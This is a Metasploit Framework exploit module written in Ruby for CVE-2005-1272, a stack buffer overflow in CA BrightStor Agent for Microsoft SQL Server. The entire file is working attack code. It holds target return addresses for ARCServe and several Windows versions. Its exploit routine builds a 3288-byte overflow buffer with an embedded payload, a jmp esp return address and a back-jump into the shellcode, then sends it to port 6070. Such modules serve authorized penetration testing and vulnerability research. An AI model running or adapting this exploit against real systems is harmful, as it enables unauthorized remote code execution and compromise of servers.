##
# $Id: sql_agent.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor Agent for Microsoft SQL Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the CA BrightStor
				Agent for Microsoft SQL Server. This vulnerability was
				discovered by cybertronic[at]gmx.net.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					[ 'CVE', '2005-1272'],
					[ 'OSVDB', '18501' ],
					[ 'BID', '14453'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=287&type=vulnerabilities'],
					[ 'URL', 'http://www3.ca.com/securityadvisor/vulninfo/vuln.aspx?id=33239'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					# This exploit requires a jmp esp for return
					['ARCServe 11.0 Asbrdcst.dll 12/12/2003',     { 'Platform' => 'win', 'Ret' => 0x20c11d64 }], # jmp esp
					['ARCServe 11.1 Asbrdcst.dll 07/21/2004',     { 'Platform' => 'win', 'Ret' => 0x20c0cd5b }], # push esp, ret
					['ARCServe 11.1 SP1 Asbrdcst.dll 01/14/2005', { 'Platform' => 'win', 'Ret' => 0x20c0cd1b }], # push esp, ret

					# Generic jmp esp's
					['Windows 2000 SP0-SP3 English',              { 'Platform' => 'win', 'Ret' => 0x7754a3ab }], # jmp esp
					['Windows 2000 SP4 English',                  { 'Platform' => 'win', 'Ret' => 0x7517f163 }], # jmp esp
					['Windows XP SP0-SP1 English',                { 'Platform' => 'win', 'Ret' => 0x71ab1d54 }], # push esp, ret
					['Windows XP SP2 English',                    { 'Platform' => 'win', 'Ret' => 0x71ab9372 }], # push esp, ret
					['Windows 2003 SP0 English',                  { 'Platform' => 'win', 'Ret' => 0x71c03c4d }], # push esp, ret
					['Windows 2003 SP1 English',                  { 'Platform' => 'win', 'Ret' => 0x71c033a0 }], # push esp, ret
				],
			'DisclosureDate' => 'Aug 02 2005',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(6070)
			], self.class)
	end


	def exploit

		print_status("Trying target #{target.name}...")

		# The 'one line' request does not work against Windows 2003
		1.upto(5) { |i|

			# Flush some memory
			connect
			begin
				sock.put("\xff" * 0x12000)
				sock.get_once
			rescue
			end
			disconnect


			# 3288 bytes max
			#  696 == good data (1228 bytes contiguous) @ 0293f5e0
			# 3168 == return address
			# 3172 == esp @ 0293ff8c (2476 from good data)

			buf = rand_text_english(3288, payload_badchars)
			buf[ 696, payload.encoded.length ] = payload.encoded
			buf[3168, 4] = [target.ret].pack('V')  # jmp esp
			buf[3172, 5] = "\xe9\x4f\xf6\xff\xff"  # jmp -2476

			connect
			begin
				sock.put(buf)
				sock.get_once
			rescue
			end

			handler
			disconnect
		}
	end

end